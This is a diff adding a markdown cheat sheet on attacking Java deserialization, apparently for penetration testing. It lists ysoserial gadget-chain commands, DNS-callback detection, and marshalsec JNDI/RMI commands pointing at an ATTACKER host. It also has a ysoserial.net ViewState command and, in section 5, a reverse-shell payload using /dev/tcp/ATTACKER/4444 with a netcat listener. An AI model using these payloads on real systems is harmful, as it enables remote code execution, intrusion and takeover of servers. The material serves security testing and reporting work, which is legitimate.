@@ -1,0 +1,103 @@
+# Java Deserialization Attacks
+
+## 1. DETECTION
+Java serialized objects start with magic header:
+```
+Hex:   aced 0005
+Base64 start:  rO0AB
+Header text:  \xAC\xED\x00\x05
+```
+Cookie examples:
+```
+Cookie: session=rO0ABXNyABJkdW1teS5QZXJzb25OYW1l...
+Cookie: JSESSIONID=...
+Cookie: auth=rO0AB...
+```
+Also test:
+```
+Content-Type: application/x-java-serialized-object
+Header:  X-Content-Type-Options: nosniff
+Body values named: data, token, session, payload, blob
+```
+ViewState base64: starts `AAMlAgAA...,` or `+gAA...` → .NET not Java.
+
+## 2. BLIND DETECTION W/O REVERSE SHELL
+Generate a chain that performs a DNS lookup; watch your DNS server:
+```bash
+java -jar ysoserial.jar CommonsCollections1 "nslookup COLLAB.burpcollaborator.net" > payload.bin
+# or print base64 for text endpoint:
+cat payload.bin | base64 -w0
+```
+If you get a DNS hit → RCE chain confirmed even without a shell.
+
+## 3. COMMON YSOSERIAL CHAINS
+```bash
+# list chains
+java -jar ysoserial.jar
+
+# pick based on the app's libraries (gadgets on classpath):
+java -jar ysoserial.jar CommonsCollections1 "id"
+java -jar ysoserial.jar CommonsCollections2 "id"
+java -jar ysoserial.jar CommonsCollections3 "id"
+java -jar ysoserial.jar CommonsCollections4 "id"
+java -jar ysoserial.jar CommonsCollections5 "id"
+java -jar ysoserial.jar CommonsCollections6 "id"
+java -jar ysoserial.jar CommonsCollections7 "id"
+java -jar ysoserial.jar CommonsBeanutils1 "id"
+java -jar ysoserial.jar Groovy1 "id"
+java -jar ysoserial.jar Spring1 "id"
+java -jar ysoserial.jar Spring2 "id"
+java -jar ysoserial.jar Hibernate1 "id"
+java -jar ysoserial.jar MozillaRhino1 "id"
+java -jar ysoserial.jar JRMPClient "ATTACKER:1099"
+java -jar ysoserial.jar URLDNS "http://COLLAB.oastify.com"      # safe-ish detection
+```
+Handy non-RCE "safe" detectors:
+- `URLDNS` → triggers DNS without full command execution. Great first test.
+- `JRMPClient` → callback to YOUR JRMP listener.
+
+## 4. BASE64 / RAW TRANSMISSION
+```bash
+cat payload.bin | base64 -w0          # HTTP cookie/body
+python3 -c "print(open('payload.bin','rb').read().hex())"   # hex param
+```
+
+## 5. BLIND EXPLOITATION (no output visible)
+If the app deserializes but response is empty/blind:
+1. Chain executes DNS first: `nslookup ...`
+2. Shell callback to netcat listener — standard reverse shell:
+```bash
+nc -lvnp 4444
+java -jar ysoserial.jar CommonsCollections5 "bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"
+```
+(URL-encode space if in URL.)
+
+## 6. EXCEPTION ORACLE (blind confirmation)
+Wrong chain → stack trace / 500. Correct chain → no error or clean 200. Compare:
+```
+Data: rO0AB....  (correct gadget → no stack trace)
+Data: rO0AB....  (garbage → DeserializationException in response)
+```
+
+## 7. WHEN THE APP COOKIE IS HMAC-SIGNED
+`Cookie: Data=...&Signature=...`  — you need the signing key:
+- Look for shared secret in JS source / env / leaked config
+- Or check if validation uses "merely HMAC with weak key" → brute force
+
+## 8. RMIRegistry / JNDI route (if RMI/IIOP exposed)
+```
+rmi://ATTACKER:1099/Exploit
+java -jar marshalsec.jar RMIRegistry 1099
+java -jar marshalsec.jar JNDIRefServer "http://ATTACKER/#Exploit"
+```
+LF/http references in `Reference` from JNDI (Log4j classic).
+
+## 9. ysoserial.net (for .NET ViewState / WCF)
+```powershell
+ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami>c:\pw.txt" --validationalg="SHA1" --validationkey="...VIEWSTATE KEY IF LEAKED..."
+```
+(Without the machine key you usually cannot exploit ViewState; report if key is leaked/config dumped.)
+
+## Reporting
+- If any DNS callback on `URLDNS`/`CommonsCollections` → deserialization security issue (critical).
+- Show the raw base64 and the chain name + target lib in the report.
